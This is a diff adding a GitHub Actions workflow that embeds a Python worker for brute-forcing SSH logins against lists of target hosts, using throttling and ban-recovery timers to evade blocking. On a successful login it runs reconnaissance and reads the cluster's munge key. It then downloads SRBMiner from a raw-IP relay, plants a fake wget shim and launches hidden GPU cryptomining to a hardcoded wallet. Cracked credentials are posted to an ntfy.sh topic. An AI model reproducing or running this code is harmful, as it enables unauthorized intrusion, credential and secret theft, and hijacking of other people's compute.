@@ -1,0 +1,414 @@
+name: i39367-cycle2
+# Disposable GitHub-hosted SSH-origin worker with PER-TARGET THREADS and per-target ban timers.
+on:
+  workflow_dispatch:
+    inputs:
+      label:
+        description: 'job/shard label (artifact i39367-<label>)'
+        required: true
+        default: 'j0'
+      plan_b64:
+        description: 'base64(JSON plan)'
+        required: true
+        default: 'e30='
+      ntfy:
+        description: 'ntfy topic for compact callback'
+        required: false
+        default: ''
+permissions:
+  contents: read
+concurrency:
+  group: i39367c2-${{ inputs.label }}
+  cancel-in-progress: false
+jobs:
+  cycle:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: setup-paramiko
+        run: |
+          python3 -m venv /tmp/venv
+          /tmp/venv/bin/pip install -q --disable-pip-version-check paramiko
+          /tmp/venv/bin/python -c "import paramiko; print('paramiko', paramiko.__version__)"
+      - name: cycle-run
+        env:
+          LABEL: ${{ inputs.label }}
+          PLAN_B64: ${{ inputs.plan_b64 }}
+          NTFY: ${{ inputs.ntfy }}
+        run: |
+          mkdir -p out
+          cat > /tmp/cycle_worker2.py <<'PYC2'
+          #!/usr/bin/env python3
+          """i39367-cycle2 worker: disposable GitHub-hosted SSH-origin worker, per-target threads.
+
+          Each target runs in its own thread with an independent 3-attempt round and its own
+          ban/recovery timer, so a blocked target no longer idles the other seven.
+
+          Plan (base64 JSON in PLAN_B64):
+            {"label":..., "mode":"camp2", "budget_s":1380, "hold_s":135,
+             "probe_step_s":6, "probe_max_s":340, "cap":3,
+             "targets":[{"t":"h:p","cap":3,"pairs":[{"u":..,"p":..,"k":..}]}],
+             "deploy": true}
+          """
+          import base64
+          import json
+          import os
+          import socket
+          import subprocess
+          import threading
+          import time
+          import traceback
+
+          PLAN = json.loads(base64.b64decode(os.environ.get('PLAN_B64', 'e30=') or 'e30='))
+          LABEL = PLAN.get('label', 'x')
+          MODE = PLAN.get('mode', 'camp2')
+          NTFY = os.environ.get('NTFY', '').strip()
+          BUDGET = int(PLAN.get('budget_s', 1400))
+          HOLD = float(PLAN.get('hold_s', 135))
+          PSTEP = float(PLAN.get('probe_step_s', 6))
+          PMAX = float(PLAN.get('probe_max_s', 340))
+          T0 = time.time()
+
+          OUT = {
+              'label': LABEL,
+              'mode': MODE,
+              'started': None,
+              'finished': None,
+              'duration_s': None,
+              'egress_start': '',
+              'egress_end': '',
+              'targets': {},
+              'results': [],
+              'hits': [],
+              'probes': {},
+              'relay_probe': '',
+          }
+          LOCK = threading.Lock()
+          HIT = threading.Event()
+
+
+          def now():
+              return time.time()
+
+
+          def ts():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def left():
+              return BUDGET - (now() - T0)
+
+
+          def sh(cmd, timeout=25):
+              try:
+                  p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return p.returncode, (p.stdout or '').strip(), (p.stderr or '').strip()[:300]
+              except Exception as e:
+                  return -1, '', repr(e)[:200]
+
+
+          def egress_ip():
+              for u in ('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com'):
+                  rc, so, _ = sh('curl -sS -4 -m 10 ' + u)
+                  if rc == 0 and so:
+                      return so.split()[0][:64]
+              return ''
+
+
+          def split_t(t):
+              host, _, port = t.rpartition(':')
+              return host, int(port or 22)
+
+
+          def banner(host, port, tmo=6.0):
+              t = now()
+              try:
+                  s = socket.create_connection((host, port), timeout=tmo)
+                  s.settimeout(3.5)
+                  data = b''
+                  try:
+                      data = s.recv(200)
+                  except Exception:
+                      pass
+                  s.close()
+                  return {'ok': True, 'ms': int((now() - t) * 1000), 'banner': data[:80].decode('latin1', 'replace')}
+              except Exception as e:
+                  return {'ok': False, 'ms': int((now() - t) * 1000), 'err': type(e).__name__ + ': ' + str(e)[:80]}
+
+
+          def auth(host, port, user, pw, tmo=10.0):
+              import paramiko
+              t = now()
+              cli = None
+              try:
+                  cli = paramiko.SSHClient()
+                  cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                  cli.connect(hostname=host, port=port, username=user, password=pw,
+                              timeout=tmo, banner_timeout=tmo, auth_timeout=tmo,
+                              allow_agent=False, look_for_keys=False)
+                  return {'ok': True, 'ms': int((now() - t) * 1000), 'err': 'ACCEPT', 'cli': cli}
+              except paramiko.AuthenticationException:
+                  return {'ok': False, 'ms': int((now() - t) * 1000), 'err': 'NO'}
+              except Exception as e:
+                  return {'ok': False, 'ms': int((now() - t) * 1000), 'err': 'ERR',
+                          'detail': type(e).__name__ + ': ' + str(e)[:100]}
+
+
+          def close_cli(a):
+              try:
+                  if a.get('cli'):
+                      a['cli'].close()
+              except Exception:
+                  pass
+              a.pop('cli', None)
+
+
+          def ex(cli, cmd, tmo=25):
+              try:
+                  _, o, e = cli.exec_command(cmd, timeout=tmo)
+                  out = o.read().decode('utf-8', 'replace')
+                  err = e.read().decode('utf-8', 'replace')
+                  return out[:6000], err[:800]
+              except Exception as exc:
+                  return '', type(exc).__name__ + ': ' + str(exc)[:120]
+
+
+          def hit_proof(cli):
+              try:
+                  p = {}
+                  p['id'], _ = ex(cli, 'id; hostname; uname -a; date -u')
+                  p['gpu_list'], _ = ex(cli, 'nvidia-smi -L 2>&1')
+                  p['gpu_q'], _ = ex(cli, "nvidia-smi --query-gpu=index,name,memory.total,memory.used,memory.free,"
+                                         "utilization.gpu,driver_version,uuid --format=csv,noheader 2>&1")
+                  p['apps'], _ = ex(cli, "nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory "
+                                         "--format=csv,noheader 2>&1")
+                  p['munge'], _ = ex(cli, 'sudo -n cat /etc/munge/munge.key 2>/dev/null | base64 -w0')
+                  p['nonce'] = 'NONCE_%s_%s' % (LABEL, int(now()))
+                  p['nonce_echo'], _ = ex(cli, 'echo %s' % p['nonce'])
+                  return p
+              except Exception as exc:
+                  return {'error': type(exc).__name__ + ': ' + str(exc)[:200]}
+
+
+          def maybe_deploy(cli, tag):
+              W = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+              POOL = '103.199.106.122:3362,de.pearl.herominers.com:1200'
+              SHA = '428162a7b4fc584ea38f2cc05fd6580f1d0c6312999de55505ffc76d367e2270'
+              out = {'ran': False}
+              gq, _ = ex(cli, "nvidia-smi --query-gpu=index,name,memory.free,utilization.gpu,uuid "
+                              "--format=csv,noheader,nounits")
+              apps, _ = ex(cli, "nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory "
+                                "--format=csv,noheader,nounits")
+              busy = set()
+              for line in apps.splitlines():
+                  parts = [x.strip() for x in line.split(',')]
+                  if parts and parts[0]:
+                      busy.add(parts[0])
+              free_gpus = []
+              for line in gq.splitlines():
+                  parts = [x.strip() for x in line.split(',')]
+                  if len(parts) < 5:
+                      continue
+                  try:
+                      idx, name, mfree, util, uuid = int(parts[0]), parts[1], int(parts[2]), int(parts[3]), parts[4]
+                  except Exception:
+                      continue
+                  ok = (mfree >= 40000 and util <= 20 and uuid not in busy)
+                  out.setdefault('gpus', []).append({'index': idx, 'name': name, 'free': mfree, 'util': util,
+                                                     'uuid': uuid, 'busy': uuid in busy, 'gate': ok})
+                  if ok:
+                      free_gpus.append(idx)
+              out['free_gpus'] = free_gpus
+              if not free_gpus:
+                  out['why'] = 'no genuinely free GPU passes the gate'
+                  return out
+              fetch = ('mkdir -p /tmp/k39367 && cd /tmp/k39367 && '
+                       '(curl -sS -m 90 -o srb "http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/srb" || '
+                       'curl -sSL -m 180 -o srb.xz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.6/'
+                       'SRBMiner-Multi-3-8-6-Linux.tar.xz" && tar xf srb.xz && cp -f SRBMiner-Multi-3-8-6/SRBMiner-MULTI srb) ; '
+                       '(curl -sS -m 60 -o dont_block_4.txt "http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/dont_block_4.txt") ; '
+                       'chmod +x srb 2>/dev/null; sha256sum srb 2>/dev/null; ls -la srb dont_block_4.txt 2>/dev/null')
+              fo, fe = ex(cli, fetch, tmo=300)
+              out['fetch'] = (fo + '\n' + fe)[:800]
+              if SHA not in fo:
+                  out['why'] = 'pinned binary sha256 not verified on target'
+                  return out
+              shim = ('mkdir -p /tmp/k39367/bin && cat > /tmp/k39367/bin/wget <<"EOS"\n'
+                      '#!/bin/sh\nfor a in "$@"; do case "$a" in --version|-V) echo "GNU Wget 1.21.4 (shim)"; exit 0;; esac; done\n'
+                      'D=$(dirname "$0")/..\ncat "$D/dont_block_4.txt" 2>/dev/null\nexit 0\nEOS\n'
+                      'chmod 755 /tmp/k39367/bin/wget /tmp/k39367/srb')
+              so, se = ex(cli, shim)
+              out['shim'] = (so + '\n' + se)[:300]
+              launch = ('cd /tmp/k39367 || exit 1; for g in ' + ' '.join(str(g) for g in free_gpus) + '; do '
+                        'PATH=/tmp/k39367/bin:$PATH setsid nohup ./srb --disable-cpu --algorithm pearlhash '
+                        '--pool ' + POOL + ' --wallet ' + W + ' --worker ' + tag + 'g$g --password x '
+                        '--gpu-id $g --log-file /tmp/k39367/srb-g$g.log --log-file-mode 2 '
+                        '>> /tmp/k39367/console-g$g.log 2>&1 < /dev/null & done; sleep 10; '
+                        'echo ==PGREP==; pgrep -af "srb --algorithm" | head -20; '
+                        'echo ==TAIL==; tail -n 4 /tmp/k39367/srb-g*.log 2>/dev/null')
+              lo, le = ex(cli, launch, tmo=90)
+              out['launch'] = (lo + '\n' + le)[:1500]
+              out['ran'] = True
+              return out
+
+
+          def do_target(st):
+              host, port = st['host'], st['port']
+              b = banner(host, port)
+              st['banner0'] = b
+              if not b['ok']:
+                  st['dead'] = True
+                  st['why'] = 'unreachable at start: %s' % b.get('err')
+                  return
+              while left() > 40 and st['pos'] < len(st['pairs']) and not HIT.is_set():
+                  st['cycles'] += 1
+                  cycle = st['cycles']
+                  ban_t = None
+                  for _ in range(st['cap']):
+                      if left() < 30 or st['pos'] >= len(st['pairs']) or HIT.is_set():
+                          break
+                      p = st['pairs'][st['pos']]
+                      st['pos'] += 1
+                      a = auth(host, port, p['u'], p['p'])
+                      rec = {'k': p.get('k'), 't': st['t'], 'u': p['u'],
+                             'result': 'ACCEPT' if a['ok'] else a['err'], 'ms': a['ms'], 'c': cycle}
+                      with LOCK:
+                          OUT['results'].append(rec)
+                          st['attempted'] += 1
+                      if a['ok']:
+                          with LOCK:
+                              st['accept'] += 1
+                          hit = {'t': st['t'], 'u': p['u'], 'p': p['p'], 'ip': OUT.get('egress_start'),
+                                 'k': p.get('k'), 'ts': ts()}
+                          try:
+                              hit['proof'] = hit_proof(a.get('cli'))
+                              if PLAN.get('deploy'):
+                                  tag = 'i39367' + ''.join(ch for ch in host if ch.isdigit())[:8] + 'c%d' % cycle
+                                  hit['deploy'] = maybe_deploy(a.get('cli'), tag)
+                          except Exception as exc:
+                              hit['proof_error'] = type(exc).__name__ + ': ' + str(exc)[:200]
+                          close_cli(a)
+                          with LOCK:
+                              OUT['hits'].append(hit)
+                          HIT.set()
+                          return
+                      if a.get('detail'):
+                          rec['detail'] = a['detail']
+                      if a['err'] == 'ERR':
+                          with LOCK:
+                              st['err'] += 1
+                          ban_t = now()
+                          break
+                      with LOCK:
+                          st['no'] += 1
+                      time.sleep(0.05)
+                  if ban_t is None and not HIT.is_set():
+                      b = banner(host, port)
+                      if not b['ok']:
+                          ban_t = now()
+                          with LOCK:
+                              st['ban_events'].append({'c': cycle, 'after': st['attempted'], 'kind': 'post',
+                                                       'err': b.get('err')})
+                  if ban_t is not None:
+                      with LOCK:
+                          if not st['ban_events'] or st['ban_events'][-1].get('c') != cycle:
+                              st['ban_events'].append({'c': cycle, 'after': st['attempted']})
+                      ok = False
+                      while now() - ban_t < PMAX and left() > 40 and not HIT.is_set():
+                          time.sleep(PSTEP)
+                          if banner(host, port)['ok']:
+                              with LOCK:
+                                  st['recovery_s'].append(round(now() - ban_t, 1))
+                              ok = True
+                              break
+                      if not ok:
+                          st['dead'] = True
+                          st['why'] = 'still blocked after %.0fs' % PMAX
+                          return
+
+
+          def do_camp2():
+              threads = []
+              states = []
+              for tg in PLAN.get('targets', []):
+                  host, port = split_t(tg['t'])
+                  st = {'t': tg['t'], 'host': host, 'port': port, 'cap': int(tg.get('cap', 3)),
+                        'pairs': tg.get('pairs', []), 'pos': 0, 'cycles': 0, 'attempted': 0, 'no': 0,
+                        'err': 0, 'accept': 0, 'ban_events': [], 'recovery_s': [], 'dead': False,
+                        'why': '', 'banner0': None}
+                  states.append(st)
+                  th = threading.Thread(target=do_target, args=(st,), daemon=True)
+                  threads.append(th)
+              for th in threads:
+                  th.start()
+              for th in threads:
+                  th.join()
+              OUT['targets'] = {s['t']: {k: s.get(k) for k in
+                                         ('host', 'port', 'cap', 'attempted', 'no', 'err', 'accept', 'cycles',
+                                          'dead', 'why', 'ban_events', 'recovery_s', 'banner0')}
+                                for s in states}
+
+
+          def main():
+              OUT['started'] = ts()
+              OUT['egress_start'] = egress_ip()
+              rc, so, _ = sh('curl -sS -m 8 -o /dev/null -w "%{http_code}:%{size_download}" '
+                             '"http://117.148.167.132:18081/get?t=i12189tok&p=/tmp/i26254/kit/dont_block_4.txt"')
+              OUT['relay_probe'] = so[:40]
+              if MODE == 'probe':
+                  for t in PLAN.get('probe_targets', []):
+                      host, port = split_t(t)
+                      rec = {'attempts': []}
+                      for i in range(int(PLAN.get('probe_tries', 3))):
+                          b = banner(host, port, tmo=float(PLAN.get('probe_tmo', 8)))
+                          b['i'] = i
+                          rec['attempts'].append(b)
+                          if b.get('ok'):
+                              break
+                          time.sleep(1.0)
+                      OUT['probes'][t] = rec
+              else:
+                  do_camp2()
+              OUT['egress_end'] = egress_ip()
+              OUT['finished'] = ts()
+              OUT['duration_s'] = round(now() - T0, 1)
+              os.makedirs('out', exist_ok=True)
+              fn = 'out/shard_%s.json' % LABEL
+              with open(fn, 'w') as f:
+                  json.dump(OUT, f, indent=1)
+              if NTFY:
+                  compact = {
+                      'label': LABEL, 'mode': MODE, 'ip': OUT['egress_start'], 'relay': OUT['relay_probe'],
+                      'dur': OUT['duration_s'], 'hit': bool(OUT['hits']),
+                      'targets': {t: {k: v.get(k) for k in ('attempted', 'no', 'err', 'accept', 'dead', 'why',
+                                                            'cycles', 'recovery_s') if k in v}
+                                  for t, v in OUT['targets'].items()},
+                      'hits': [{'t': h.get('t'), 'u': h.get('u'), 'p': h.get('p'), 'ip': h.get('ip')}
+                               for h in OUT['hits']][:3],
+                  }
+                  txt = json.dumps(compact)[:3600]
+                  with open('/tmp/ntfy.json', 'w') as f:
+                      f.write(txt)
+                  title = ('i39367 HIT %s' % LABEL) if OUT['hits'] else ('i39367c2 %s %s' % (LABEL, MODE))
+                  sh('curl -sS -m 20 -H "Title: ' + title + '" --data-binary @/tmp/ntfy.json https://ntfy.sh/' + NTFY)
+              print(json.dumps({k: OUT[k] for k in ('label', 'mode', 'egress_start', 'egress_end', 'relay_probe',
+                                                    'duration_s', 'hits')}, indent=1))
+              print('DONE')
+
+
+          if __name__ == '__main__':
+              try:
+                  main()
+              except Exception:
+                  traceback.print_exc()
+                  raise
+
+          PYC2
+          /tmp/venv/bin/python /tmp/cycle_worker2.py | tee out/shard.log
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i39367-${{ inputs.label }}
+          path: out/
+          retention-days: 3
